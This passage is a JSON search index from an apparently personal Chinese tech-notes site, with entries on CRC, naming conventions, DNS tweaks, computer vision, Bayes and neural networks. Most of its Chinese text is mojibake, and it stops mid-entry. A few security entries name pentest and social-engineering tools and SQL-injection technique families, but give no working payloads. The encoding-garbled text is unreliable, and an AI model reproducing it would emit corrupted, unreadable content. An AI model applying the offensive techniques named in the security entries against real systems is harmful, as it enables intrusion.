¹æ®ç½‘ä¸Šæ•°æ®åŒ…æˆ–è®¡ç®—æœºæ–‡ä»¶ç­‰æ•°æ®äº§ç”Ÿç®€çŸ­å›ºå®šä½æ•°æ ¡éªŒç çš„ä¸€ç§æ•£åˆ—å‡½æ•°ï¼Œä¸»è¦ç”¨æ¥æ£€æµ‹æˆ–æ ¡éªŒæ•°æ®ä¼ è¾“æˆ–è€…ä¿å­˜åå¯èƒ½å‡ºç°çš„é”™è¯¯ã€‚ç”Ÿæˆçš„æ•°å­—åœ¨ä¼ è¾“æˆ–è€…å­˜å‚¨ä¹‹å‰è®¡ç®—å‡ºæ¥å¹¶ä¸”é™„åŠ åˆ°æ•°æ®åé¢ï¼Œç„¶åæ¥æ”¶æ–¹è¿›è¡Œæ£€éªŒç¡®å®šæ•°æ®æ˜¯å¦å‘ç”Ÿå˜åŒ–ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå¾ªç¯å†—ä½™æ ¡éªŒçš„å€¼éƒ½æ˜¯32ä½çš„æ•´æ•°ã€‚ æ ¡éªŒåŸç† è¢«é™¤æ•° é™¤ä»¥ é™¤æ•° = å•† å‘é€ç«¯ å’Œ æ¥æ”¶ç«¯ é€‰å®šä¸€ä¸ªç‰¹å®šçš„æ•° (è¿™é‡Œç§°ä¹‹ä¸”åæ–‡éƒ½ç§°ä¹‹ä¸º é™¤æ•° ) åœ¨ å‘é€ç«¯ å‘é€çš„äºŒè¿›åˆ¶å¸§é™„åŠ ä¸€ä¸ª äºŒè¿›åˆ¶æ ¡éªŒç  , ç”Ÿæˆä¸€ä¸ª æ–°çš„å¸§ . æ³¨æ„: éœ€è¦ä¿è¯èƒ½ä¸ é™¤æ•° æ•´é™¤ åˆ°è¾¾ æ¥å—ç«¯ , ä½¿ç”¨æ¥å—åˆ°çš„ æ–°çš„å¸§ , å°è¯•ä¸ é™¤æ•° æ•´é™¤, æ²¡æœ‰ä½™æ•° å°±æ˜¯æ­£ç¡®çš„, æœ‰ä½™æ•°è¯´æ˜æ•°æ®å·²è¢«ä¿®æ”¹. ä»¥ä¸Šè®¡ç®—ä½¿ç”¨ æ¨¡äºŒé™¤æ³• (æ²¡æœ‰è¿›ä½) æ¨¡äºŒè®¡ç®— æ— è¿›ä½çš„äºŒè¿›åˆ¶è®¡ç®— æ¨¡äºŒåŠ æ³•: 0+0=0 0+1=1 1+0=1 1+1=0 æ¨¡äºŒå‡æ³•: 0-0=0 0-1=1 1-0=1 1-1=0 æ¨¡äºŒä¹˜æ³•: 0x0=0 0x1=0 1x0=0 1x1=1 æ¨¡äºŒé™¤æ³•, ä¸æ™®é€šé™¤æ³•ç±»ä¼¼, ä¸è¿‡åŠ å‡æ—¶ä½¿ç”¨ æ¨¡äºŒåŠ å‡æ³• ç¤ºä¾‹ é€‰å®šCRCç”Ÿæˆå¤šé¡¹å¼ä¸º G ( X ) = X 4 + X 3 + 1 è¦æ±‚å‡ºäºŒè¿›åˆ¶åºåˆ— 10110011 çš„ CRCæ ¡éªŒç . é¦–å…ˆ, å°† CRCç”Ÿæˆå¤šé¡¹å¼ è½¬æ¢ä¸ºäºŒè¿›åˆ¶åºåˆ— 11001 (ç¬¬ä¸€ä½, ç¬¬å››ä½, ç¬¬äº”ä½æ˜¯1) å¤šé¡¹å¼çš„ä½æ•°ä¸º5, åˆ™åœ¨æ•°æ®å¸§çš„åé¢åŠ ä¸Š (5-1) ä½ 0, æ•°æ®å¸§å˜ä¸º 101100110000 , ç„¶åä½¿ç”¨æ¨¡2é™¤æ³•é™¤ä»¥é™¤æ•° 11001 , å¾—åˆ°ä½™æ•° 0100 (è‹¥ä½™æ•°ä½æ•°ä¸è¶³, åœ¨é¦–éƒ¨è¡¥0). å°†è®¡ç®—å‡ºæ¥çš„CRCæ ¡éªŒç  0100 æ·»åŠ åœ¨åŸå§‹å¸§çš„åé¢, çœŸæ­£çš„æ•°æ®å¸§ä¸º 101100110100 , å†æŠŠè¿™ä¸ªæ•°æ®å¸§å‘é€åˆ°æ¥æ”¶ç«¯. æ¥æ”¶ç«¯æ”¶åˆ°æ•°æ®å¸§å, ç”¨ä¸Šé¢é€‰å®šçš„é™¤æ•°, ç”¨æ¨¡2é™¤æ³•é™¤å», éªŒè¯ä½™æ•°æ˜¯å¦ä¸º0, å¦‚æœä¸º0, åˆ™è¯´æ˜æ•°æ®å¸§æ²¡æœ‰å‡ºé”™ çœ‹åˆ°ä¸€ç¯‡è§£é‡Šå¾ˆè¯¦ç»†çš„: å²ä¸Šè§£é‡ŠCRCæœ€æ¸…æ¥šçš„æ–‡ç« ","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-CRC-data-verification.html","loc":"/yq-doc-source-docs-Chaotic-CRC-data-verification.html"},{"title":"ä»£ç å‘½å","text":"ç±»/å‡½æ•°å£°æ˜ å¯¹äºç±»å, ç”¨åè¯, å› ä¸ºè¡¨ç¤ºçš„æ˜¯å¯¹è±¡ å‡½æ•°, æ–¹æ³•å¯ä»¥åŠ å…¥åŠ¨è¯, å› ä¸ºæ˜¯è¡¨ç¤ºè¡Œä¸º. å‘½åè§„èŒƒ å…³äºå‘½åè§„èŒƒ, ä¸šç•Œä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸¤ç§: é©¼å³° - å¤§é©¼å³°: é¦–å­—æ¯å¤§å°, åé¢æ¯ä¸ªé€»è¾‘æ–­ç‚¹çš„å•è¯é¦–å­—æ¯ä¹Ÿå¤§å†™. å¦‚: CatEyes - å°é©¼å³°: é¦–å­—æ¯å°å†™, åé¢æ¯ä¸ªé€»è¾‘æ–­ç‚¹çš„å•è¯é¦–å­—æ¯å¤§å†™. å¦‚: catEyes ä¸‹åˆ’çº¿: æ¯ä¸ªé€»è¾‘æ–­ç‚¹å¤„éƒ½åŠ ä¸‹åˆ’çº¿. å¦‚: cat_eyes åŒˆç‰™åˆ©: å˜é‡å=å±æ€§+ç±»å‹+å¯¹è±¡æè¿°. å¦‚: m_iVar é™¤éæ‰€åœ¨å•ä½æœ‰ç¡¬æ€§è§„å®š, å¦åˆ™ä½¿ç”¨æ—¶è‡ªç”±çš„, æ··åˆç”¨ä¹Ÿå¯ä»¥. é™„: åŒˆç‰™åˆ©å‘½åæ³•ä¸­å¸¸ç”¨çš„å°å†™å­—æ¯çš„å‰ç¼€ å‰ç¼€ ç±»å‹ i æ•´å‹ n çŸ­æ•´å‹ (Short Int) l é•¿æ•´å‹ (Long Int) c æœ‰ç¬¦å·å­—ç¬¦ (Char) by å­—èŠ‚ (Byte) w Word b å¸ƒå°”å€¼ (Boolean) s å­—ç¬¦ä¸²å‹ a æ•°ç»„ (Array) p æŒ‡é’ˆ(Pointer) lp é•¿æŒ‡é’ˆ(Long Pointer) m_ ç±»çš„æˆå‘˜ fn å‡½æ•° h Handleï¼ˆå¥æŸ„ï¼‰","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-Code-name.html","loc":"/yq-doc-source-docs-Chaotic-Code-name.html"},{"title":"è®°å½•vsä¸‹è½½å®‰è£…æ…¢çš„é—®é¢˜","text":"é¦–å…ˆè·å–ä¸‹è½½åœ°å€, æ¯”å¦‚ä¸‹è½½vs2022ç›¸å…³è½¯ä»¶åŒ…, åœ°å€å°±æ˜¯ download.visualstudio.microsoft.com (å¾—è‡ªå·±æ‰¾) å» DNSæŸ¥è¯¢ç½‘ç«™ æŸ¥è¯¢ç›¸å…³æ”¹ä¸‹è½½åœ°å€çš„ç›¸å…³ä¿¡æ¯, ç„¶åé€‰æ‹© ttl æœ€å°çš„é‚£ä¸ª, è®¾ç½®DNS dnsç½‘ç«™æŸ¥è¯¢ æœ€åå»windowsä¿®æ”¹DNSé…ç½® (æ•ˆæœä¸ä¸€å®š) ä¿®æ”¹dnsé…ç½® æ³¨è§£ é¡ºä¾¿è¯´ä¸€å¥, æƒ³èµ·ä¹‹å‰windowsç™»å½•å¾®è½¯è´¦å·æ—¶, ä¸€ç›´é“¾ä¸ä¸Šç½‘, åé¢å–æ¶ˆ ipv6 å°±å¯ä»¥äº†ã€‚","tags":"æ‚ä¹±æ— ç« ","url":"/yq-doc-source-docs-Chaotic-Record-the-problem-of-slow-download-vs-download.html","loc":"/yq-doc-source-docs-Chaotic-Record-the-problem-of-slow-download-vs-download.html"},{"title":"æ¸—é€æµ‹è¯•æµç¨‹","text":"æ¸—é€æµ‹è¯•æµç¨‹ ä¿¡æ¯æ”¶é›† -> æ¼æ´æ‰«æ -> æ¼æ´åˆ©ç”¨ -> æƒé™æå‡ -> å¯†ç ç ´è§£ -> æ— çº¿ç½‘ç»œçš„æ¸—é€ ä¿¡æ¯æ”¶é›† å·¥å…·: dnsenum nmap amap maltego ç”»ç½‘ç»œç»“æ„å›¾","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Penetration-test-process.html","loc":"/yq-doc-source-docs-Safety-Penetration-test-process.html"},{"title":"å¤‡å¿˜","text":"HTTrack å…‹éš†ç½‘ç«™å·¥å…·, é™æ€ç½‘é¡µ è¿˜æœ‰ä¸€ä¸ª setoolkit å·¥å…·ä¹Ÿå¯ä»¥ setoolkit ç¤¾ä¼šå·¥ç¨‹å­¦å·¥å…·(social engineering toolkit), å¼€æº, åŸºäºPython. ç¤¾ä¼šå·¥ç¨‹å­¦å·¥å…· ææƒ æ³¨è§£ # todo: ä¸ºä»€ä¹ˆéœ€è¦é™æƒ ä¸ºä»€ä¹ˆéœ€è¦é™æƒ? å¹¶ä¸æ˜¯æœ€é«˜æƒé™å°±å¯ä»¥åšä¸€åˆ‡... æœ‰ç‚¹ä¸ç†è§£, åé¢å¤„ç† æ‚ä¹±æ— ç«  åŠ å¯†æ–¹å¼: å¯¹ç§°åŠ å¯† åŠ è§£å¯†ä½¿ç”¨åŒä¸€é’¥åŒ™ - DES - AES éå¯¹ç§°åŠ å¯† åŠ è§£å¯†ä½¿ç”¨ä¸åŒé’¥åŒ™ - RSA æ¯”å¦‚SSHçš„å¯†é’¥ç™»é™†. HTTPSçš„è¯ä¹¦(å…¬é’¥å¤§å®¶éƒ½æœ‰, ç”¨æ¥åŠ å¯†æ•°æ®, ç§é’¥åªæœ‰æ‰€æœ‰è€…æœ‰, ä¿è¯åªæœ‰è‡ªå·±å¯ä»¥çœ‹) æŠ€å·§ ä»…é éå¯¹ç§°åŠ å¯†å…¶å®ä¹Ÿä¸èƒ½çœŸæ­£ä¿è¯å®‰å…¨, æ•°æ®åŒ…æ˜¯åœ¨ç½‘ç»œä¸ŠæµåŠ¨çš„, å…¶ä»–äººå¯ä»¥ç›´æ¥åœ¨ç½‘ç»œä¸Šè·å–åŠ å¯†åçš„åŒ…ä¸‹æ¬¡å†ç›´æ¥ç”¨è¿™ä¸ªåŒ…. æ‰€ä»¥è®¾ç½®è¶…æ—¶æ˜¯æœ‰å¿…è¦çš„, æ¯”å¦‚: ç™»é™†æ—¶, å¯¹å¯†ç å…ˆå…¬é’¥åŠ å¯†, å†å¯¹åŠ å¯†åçš„æ•°æ®åŠ æ—¶é—´æˆ³åå†æ¬¡åŠ å¯†, ä¿è¯äº†æ¯æ¬¡å‘åŒ…æ•°æ®æ˜¯ä¸ä¸€æ ·çš„, åç«¯å†è®¾ç½®ä¸€ä¸ªè¾ƒå°çš„è¿‡æœŸéªŒè¯æ—¶é—´, è¶…æ—¶æ‹’ç»ç™»é™†. ä¸è¿‡ä¹Ÿæœ‰ä¸€ä¸ªé—®é¢˜, å†ç™»é™†æœ‰æ•ˆæœŸå†…, è¿˜æ˜¯å¯ä»¥è¢«ä½¿ç”¨ç™»é™†. åªèƒ½å°½é‡ä¿è¯ç™»é™†æœ‰æ•ˆæœŸè¶³å¤Ÿå°ç­‰æªæ–½äº†. MACåœ°å€ç»“æ„ å¦‚: AA:BB:CC:DD:EE:FF å‰ä¸‰ä½ AA:BB:CC è¡¨ç¤ºå‚å•† åä¸‰ä½ DD:EE:FF è¡¨ç¤ºå‚å•†åˆ†é…çš„è®¾å¤‡æ ‡è¯†","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Some-memo.html","loc":"/yq-doc-source-docs-Safety-Some-memo.html"},{"title":"æ¼æ´ç¼ºé™·åˆ†ç±»","text":"äº§å“ç¼ºé™· æŠ€æœ¯ç¼ºé™· ç®¡ç†ç¼ºé™· ä¸šåŠ¡ç¼ºé™· äººæ€§æ¼æ´(...) SQLæ³¨å…¥æ¼æ´ æ¼æ´-è·å–æ•°æ® åŸºäºmysqlå»¶æ—¶ - sleep åŸºäºmysqlæŠ¥é”™ - group_by - updatexml - extractvalue æ¼æ´-æ³¨å…¥ åŸºäºuser-agent sqlmapè‡ªåŠ¨æ³¨å…¥å·¥å…·","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Vulnerable-defect-classification.html","loc":"/yq-doc-source-docs-Safety-Vulnerable-defect-classification.html"},{"title":"é¢œè‰²ç©ºé—´","text":"é¢œè‰²ç©ºé—´ä¹Ÿç§°å½©è‰²æ¨¡å‹ï¼Œç”¨äºæè¿°è‰²å½© å¸¸è§çš„é¢œè‰²ç©ºé—´åŒ…æ‹¬ RGBã€CMYKã€YUKã€L*A*B*ã€HSLå’ŒHSV/HSBç­‰ RGB æœ€å¸¸ç”¨ å·¥ä¸šç•Œä¸€ç§é¢œè‰²æ ‡å‡† å¯¹ çº¢ç»¿è“ä¸‰ä¸ªé¢œè‰²é€šé“çš„å˜åŒ–ä»¥åŠç›¸äº’å åŠ æ¥å¾—åˆ°å„å¼å„æ ·çš„é¢œè‰² æ¯ä¸ªé€šé“å„åˆ†ä¸º256é˜¶ CMYK ä¸»è¦ç”¨äºçººç»‡ã€ä¸Šè‰² YUK æ™ºèƒ½è®¾å¤‡å‡ºå›¾ HSV HSVè‰²å½©æ¨¡å¼ è‰²ç›¸(Hue) ç‰©ä½“ä¼ å¯¼æˆ–åå°„çš„æ³¢é•¿ã€‚æ›´å¸¸è§çš„æ˜¯ä»¥é¢œè‰²æ¯”å¦‚çº¢è‰²ï¼Œæ©˜è‰²æˆ–ç»¿è‰²æ¥è¾¨è¯†ï¼Œå– 0-360 åº¦çš„æ•°å€¼æ¥è¡¡é‡ é¥±å’Œåº¦(Saturation) åˆç§°è‰²åº¦ï¼Œæ˜¯æŒ‡è‰²å½©çš„å¼ºåº¦æˆ–çº¯åº¦ï¼Œå–å€¼èŒƒå›´ä¸º 0%-100% æ˜åº¦(Value) è¡¨ç¤ºé¢œè‰²æ˜äº®çš„ç¨‹åº¦ï¼Œå–å€¼èŒƒå›´ä¸º 0%(é»‘)-100%(ç™½) other ç°åº¦å›¾","tags":"AI","url":"/yq-doc-source-docs-AI-Computer-vision-Color-space.html","loc":"/yq-doc-source-docs-AI-Computer-vision-Color-space.html"},{"title":"è®¡ç®—æœºè§†è§‰","text":"é¢œè‰²ç©ºé—´","tags":"AI","url":"/yq-doc-source-docs-AI-Computer-vision-index.html","loc":"/yq-doc-source-docs-AI-Computer-vision-index.html"},{"title":"è´å¶æ–¯","text":"è´å¶æ–¯å®šç†ç”±è‹±å›½æ•°å­¦å®¶è´å¶æ–¯ ( Thomas Bayes 1702-1761å¹´) å‘å±•ï¼Œ ç”¨æ¥æè¿°ä¸¤ä¸ªæ¡ä»¶æ¦‚ç‡ä¹‹é—´çš„å…³ç³»ï¼Œæ¯”å¦‚: P(A|B) å’Œ P(B|A) æŒ‰ç…§ä¹˜æ³•æ³•åˆ™ï¼Œå¯ä»¥ç«‹åˆ»å¯¼å‡º: P(Aâˆ©B) = P(A)*P(B|A)=P(B)*P(A|B) å¦‚ä¸Šå…¬å¼ä¹Ÿå¯å˜å½¢ä¸º: P(A|B)=P(B|A)*P(A)/P(B) å¾—åˆ° äº‹ä»¶Aåœ¨äº‹ä»¶B(å‘ç”Ÿ)çš„æ¡ä»¶ä¸‹çš„æ¦‚ç‡ è´å¶æ–¯å…¬å¼åˆè¢«ç§°ä¸ºè´å¶æ–¯å®šç†, è´å¶æ–¯è§„åˆ™æ˜¯æ¦‚ç‡ç»Ÿè®¡ä¸­çš„åº”ç”¨æ‰€è§‚å¯Ÿåˆ°çš„ç°è±¡å¯¹æœ‰å…³æ¦‚ç‡åˆ†å¸ƒçš„ä¸»è§‚åˆ¤æ–­ï¼ˆå³å…ˆéªŒæ¦‚ç‡ï¼‰è¿›è¡Œä¿®æ­£çš„æ ‡å‡†æ–¹æ³•ã€‚ å…¬å¼ å…¶ä¸­ï¼ŒP(A)å¯ä»¥ç§°ä¹‹ä¸ºå…ˆéªŒæ¦‚ç‡ï¼ŒP(A|B)æ˜¯åéªŒæ¦‚ç‡ åº”ç”¨åœºæ™¯ï¼šæŸäº›æƒ…å†µä¸‹å¾ˆéš¾å¾—åˆ° P(A|B)ï¼Œæ‰€æœ‰æ ¹æ®åˆ«çš„æ¥ç®— ä¾‹å­, ç°åˆ†åˆ«æœ‰ Aã€B ä¸¤ä¸ªå®¹å™¨ï¼Œ åœ¨å®¹å™¨ A é‡Œåˆ†åˆ«æœ‰ 7 ä¸ªçº¢çƒå’Œ 3 ä¸ªç™½çƒï¼Œ åœ¨å®¹å™¨ B é‡Œæœ‰ 1 ä¸ªçº¢çƒå’Œ 9 ä¸ªç™½çƒï¼Œ ç°å·²çŸ¥ä»è¿™ä¸¤ä¸ªå®¹å™¨é‡Œä»»æ„æŠ½å‡ºäº†ä¸€ä¸ªçº¢çƒï¼Œé—®è¿™ä¸ªçƒæ¥è‡ªå®¹å™¨ A çš„æ¦‚ç‡æ˜¯å¤šå°‘? å‡è®¾å·²ç»æŠ½å‡ºçº¢çƒä¸ºäº‹ä»¶ Bï¼Œ é€‰ä¸­å®¹å™¨ A ä¸ºäº‹ä»¶ Aï¼Œ åˆ™æœ‰: P(B) = 8/20 P(A) = 1/2 P(B|A) = 7/10 æŒ‰ç…§å…¬å¼ï¼Œåˆ™æœ‰: P(A|B) = (7/10)*(1/2) / (8/20) = 0.875 å‚è€ƒ: ç™¾åº¦ç™¾ç§‘-è´å¶æ–¯ æ­£å‘æ¦‚ç‡ä¸é€†å‘æ¦‚ç‡ æ­£å‘æ¦‚ç‡ å‡è®¾è¢‹å­æœ‰Nä¸ªç™½çƒï¼ŒMä¸ªé»‘çƒï¼Œæ±‚æ‘¸ä¸€æ¬¡ä¸ºé»‘çƒçš„æ¦‚ç‡ é€†å‘æ¦‚ç‡ å¦‚æœæˆ‘ä»¬äº‹å…ˆä¸çŸ¥é“è¢‹å­é‡Œé¢é»‘ç™½çƒæ¯”ä¾‹ï¼Œè€Œæ˜¯éšæœºæ‘¸å‡ºä¸€ä¸ªï¼ˆæˆ–å‡ ä¸ªï¼‰çƒï¼Œè§‚å¯Ÿè¿™äº›å–å‡ºçƒçš„é¢œè‰²ï¼Œå¯ä»¥å¯¹è¢‹å­ä¸­é»‘ç™½çƒçš„æ¯”ä¾‹åšå‡ºä¸€ä¸ªé¢„æµ‹","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Bayez.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Bayez.html"},{"title":"å¡å°”æ›¼æ»¤æ³¢","text":"","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Carman-Filter.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Carman-Filter.html"},{"title":"Deep Neural Networks(DNN)","text":"æ·±åº¦ç¥ç»ç½‘ç»œï¼ˆDeep Neural Networksï¼Œ ç®€ç§°DNNï¼‰æ˜¯æ·±åº¦å­¦ä¹ çš„åŸºç¡€ æ„ŸçŸ¥æœº å¯¹è¾“å…¥å“åº”è¾“å‡º, å¯ä»¥å°†å…¶å½“å¤šå•ä¸ªç¥ç»å…ƒ ç¥ç»ç½‘ç»œ åŸºäºæ„ŸçŸ¥æœºçš„æ‰©å±•ï¼Œè€ŒDNNå¯ä»¥ç†è§£ä¸ºæœ‰å¾ˆå¤šéšè—å±‚çš„ç¥ç»ç½‘ç»œã€‚ å¤šå±‚ç¥ç»ç½‘ç»œå’Œæ·±åº¦ç¥ç»ç½‘ç»œDNNå…¶å®ä¹Ÿæ˜¯æŒ‡çš„ä¸€ä¸ªä¸œè¥¿ï¼Œ DNNæœ‰æ—¶ä¹Ÿå«åšå¤šå±‚æ„ŸçŸ¥æœºï¼ˆMulti-Layer perceptron,MLPï¼‰ã€‚ ä»DNNæŒ‰ä¸åŒå±‚çš„ä½ç½®åˆ’åˆ†ï¼ŒDNNå†…éƒ¨çš„ç¥ç»ç½‘ç»œå±‚å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼Œ è¾“å…¥å±‚ï¼Œéšè—å±‚å’Œè¾“å‡ºå±‚. ä¸€èˆ¬æ¥è¯´ç¬¬ä¸€å±‚æ˜¯è¾“å…¥å±‚ï¼Œæœ€åä¸€å±‚æ˜¯è¾“å‡ºå±‚ï¼Œè€Œä¸­é—´çš„å±‚æ•°éƒ½æ˜¯éšè—å±‚ã€‚ å±‚ä¸å±‚ä¹‹é—´æ˜¯å…¨è¿æ¥çš„. ä¹Ÿå°±æ˜¯è¯´ï¼Œç¬¬iå±‚çš„ä»»æ„ä¸€ä¸ªç¥ç»å…ƒä¸€å®šä¸ç¬¬i+1å±‚çš„ä»»æ„ä¸€ä¸ªç¥ç»å…ƒç›¸è¿ã€‚ è™½ç„¶DNNçœ‹èµ·æ¥å¾ˆå¤æ‚ï¼Œä½†æ˜¯ä»å°çš„å±€éƒ¨æ¨¡å‹æ¥è¯´ï¼Œ è¿˜æ˜¯å’Œæ„ŸçŸ¥æœºä¸€æ ·ï¼Œå³ä¸€ä¸ªçº¿æ€§å…³ç³»: z = wx + b åŠ ä¸Šä¸€ä¸ªæ¿€æ´»å‡½æ•°: Ã¸(z)","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-DNN.html","loc":"/yq-doc-source-docs-AI-Deep-learning-DNN.html"},{"title":"äººè„¸è¯†åˆ«","text":"ç”±äºè®­ç»ƒé›†å¾€å¾€åªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œæ‰€ä»¥éœ€è¦æ¯”è¾ƒçš„æ˜¯å·®å¼‚å€¼ï¼Œå³ä½¿ç”¨Similarityå‡½æ•° Similarity: d(img1,img2)=degree of difference between images æ¯”è¾ƒè·ç¦»ç¼–ç  Siameseç½‘ç»œ ä¸‰å…ƒç»„æŸå¤± åŒæ—¶çœ‹ä¸‰å¼ å›¾ç‰‡ï¼Œå±äºåŒä¸€ä¸ªäººçš„ç¼–ç è·ç¦»è¾ƒå°ï¼Œåä¹‹è¾ƒå¤§ å°½é‡é€‰æ‹©å·®è·å°çš„å›¾ç‰‡æ¥å¢å¤§è®­ç»ƒéš¾åº¦ è½¬æ¢ä¸ºåˆ†ç±»é—®é¢˜ é€‰å–ä¸¤ä¸ªç¥ç»ç½‘ç»œï¼Œå°†ä¸¤ä¸ªç»“æœå†æ¬¡è¾“å…¥åˆ°é€»è¾‘å›å½’å•å…ƒï¼Œ","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Face-recognition.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Face-recognition.html"},{"title":"å›¾åƒè¯†åˆ«","text":"YOLOç®—æ³• ä½¿ç”¨æ»‘åŠ¨çª—å£é¢„æµ‹æ¯ä¸€ä¸ªæ ¼å­ï¼ˆæ¯”å¦‚ 3x3ï¼Œ19x19ï¼‰ åœ¨æ»‘åŠ¨çª—å£çš„åŸºç¡€ä¸Šï¼Œå°†å›¾ç‰‡æ˜ å°„åœ¨ [0, 1] ä¹‹é—´ï¼Œå–äº¤å¹¶æ¯”å¤§äºé˜ˆå€¼çš„ç»“æœ å¯¹äºæ£€æµ‹çª—å£æ— ç»“æœçš„æ£€æµ‹ï¼Œå‡ºç¬¬ä¸€ä¸ªæ¦‚ç‡pä¸º0ï¼Œå…¶ä»–è¾“å‡ºéƒ½ä¸ç”¨å…³å¿ƒï¼ˆä¸å‚ä¸æ¢¯åº¦è®¡ç®—ï¼‰ YOLO ç®—æ³•è®­ç»ƒæ—¶ï¼Œåªæœ‰ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­å¿ƒçš„ä¸€ä¸ªå•å…ƒè´Ÿè´£æ£€æµ‹è¿™ä¸ªå¯¹è±¡ äº¤å¹¶æ¯” (Intersection over Union) è®¡ç®—ä¸¤ä¸ªè¾¹ç•Œæ¡†äº¤é›†ä¸å¹¶é›†ä¹‹æ¯” ä¸€èˆ¬çº¦å®š iou >= 0.5ï¼Œå³æ£€æµ‹æ­£ç¡® éæœ€å¤§å€¼æŠ‘åˆ¶ (Non-max Suppression) ç¡®ä¿ç®—æ³•å¯¹æ¯ä¸ªå¯¹è±¡å€¼æ£€æµ‹ä¸€æ¬¡ æ­¥éª¤ å»æ‰æ¦‚ç‡å°äºé˜ˆå€¼çš„ç»“æœ é€‰æ‹©æ¦‚ç‡æœ€é«˜çš„ anchor box è‡ªå®šä¹‰å½¢çŠ¶æ¡†ï¼Œæ¯ä¸ªæ¡†éƒ½ä¼šæœ‰ä¸€ä¸ªè¾“å‡ºç»“æœå€¼ R-CNN ç®—æ³• å…ˆæ±‚å‡ºå€™é€‰åŒºåŸŸ","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Image-Identification.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Image-Identification.html"},{"title":"æ¨¡å‹è®­ç»ƒå¯è§†åŒ–æ¨¡å—","text":"visdom å¯åŠ¨ visdom server: python -m visdom.server è¿™ä¸€æ­¥ä¼šæœ‰ä¸€ä¸ªä¸‹è½½çš„è¿‡ç¨‹ï¼Œä¼šæ¯”è¾ƒæ…¢ ä½¿ç”¨ä¸¾ä¾‹: import visdom import numpy as np vis = visdom.Visdom() vis.text('he') vis.image(np.ones((3, 10, 10))) tensorboardx ä½¿ç”¨, å…ˆç”Ÿæˆä¸€ä¸ªç¤ºä¾‹: from tensorboardX import SummaryWriter writer = SummaryWriter('log') for i in range(100): writer.add_scalar('a', i, global_step=i) writer.add_scalar('b', i**2, global_step=i) writer.close() å¯åŠ¨: cd log tensorboard --log-dir ./","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Model-training-visualization-module.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Model-training-visualization-module.html"},{"title":"è‡ªç„¶è¯­è¨€å¤„ç†","text":"æ—¶åºæ¨¡å‹ æ„å»º one-hotæ¨¡å‹ å¯¹äºæŸä¸ªæ—¶é—´æ­¥tï¼Œ RNNä¼šè®¡ç®— $$ P(y&#94;{<t>}|y&#94;{<1>}, y&#94;{<2>}, y&#94;{<3>}, ... y&#94;{<t-1>} ) $$ æ¢¯åº¦çˆ†ç‚¸ -- NaN ï¼ˆå‡ºç°æ•°å€¼æº¢å‡ºï¼‰ï¼Œ å¯ä»¥é‡‡ç”¨æ¢¯åº¦ä¿®å‰ª, å³ å½“å¤§äºæŸä¸€ä¸ªé˜ˆå€¼ï¼Œå°±ä½¿ç”¨è°ƒæ•´åçš„å€¼ RNN åˆ†ç±»ï¼ˆå¸¸è§ï¼‰ å¤šå¯¹å¤š æ¯”å¦‚æœºå™¨ç¿»è¯‘ï¼Œæœºå™¨ç¿»è¯‘ä¸€èˆ¬éœ€è¦è§£ç å™¨ï¼Œè²Œä¼¼æ˜¯ä¸ºäº†é€‚é…é•¿åº¦ä¸ä¸€è‡´çš„é—®é¢˜ å¤šå¯¹ä¸€ æ¯”å¦‚æƒ…æ„Ÿåˆ†ç±»é—®é¢˜ï¼ˆæ­£/è´Ÿé¢è¯„ä»·æ‰“åˆ†ï¼‰ GRU ä¸ LSTM GRU LSTM é•¿çŸ­æ—¶è®°å¿†ç½‘ç»œ åŒå‘å¾ªç¯ç¥ç»ç½‘ç»œ BRNN æ·±å±‚å¾ªç¯ç¥ç»ç½‘ç»œ DRNN å…¶å®å°±æ˜¯çºµå‘å åŠ éšè—å±‚","tags":"AI","url":"/yq-doc-source-docs-AI-Deep-learning-Natural-language-processing.html","loc":"/yq-doc-source-docs-AI-Deep-learning-Natural-language-processing.html"},{"title":"æ•°æ®é¢„å¤„ç†","text":"æ•°æ®çš„å½’ä¸€åŒ–å’Œæ ‡å‡†åŒ–æ˜¯ç‰¹å¾ç¼©æ”¾(feature scaling)çš„æ–¹æ³•ï¼Œ æ˜¯æ•°æ®é¢„å¤„ç†çš„å…³é”®æ­¥éª¤ã€‚ ä¸åŒè¯„ä»·æŒ‡æ ‡å¾€å¾€å…·æœ‰ä¸åŒçš„é‡çº²å’Œé‡çº²å•ä½ï¼Œ è¿™æ ·çš„æƒ…å†µä¼šå½±å“åˆ°æ•°æ®åˆ†æçš„ç»“æœï¼Œ ä¸ºäº†æ¶ˆé™¤æŒ‡æ ‡ä¹‹é—´çš„é‡çº²å½±å“ï¼Œéœ€è¦è¿›è¡Œæ•°æ®å½’ä¸€åŒ–/æ ‡å‡†åŒ–å¤„ç†ï¼Œ ä»¥è§£å†³æ•°æ®æŒ‡æ ‡ä¹‹é—´çš„å¯æ¯”æ€§ã€‚ åŸå§‹æ•°æ®ç»è¿‡æ•°æ®å½’ä¸€åŒ–/æ ‡å‡†åŒ–å¤„ç†åï¼Œå„æŒ‡æ ‡å¤„äºåŒä¸€æ•°é‡çº§ï¼Œé€‚åˆè¿›è¡Œç»¼åˆå¯¹æ¯”è¯„ä»·ã€‚ å½’ä¸€åŒ–/æ ‡å‡†åŒ–å®è´¨æ˜¯ä¸€ç§çº¿æ€§å˜æ¢ï¼Œçº¿æ€§å˜æ¢æœ‰å¾ˆå¤šè‰¯å¥½çš„æ€§è´¨ï¼Œ è¿™äº›æ€§è´¨å†³å®šäº†å¯¹æ•°æ®æ”¹å˜åä¸ä¼šé€ 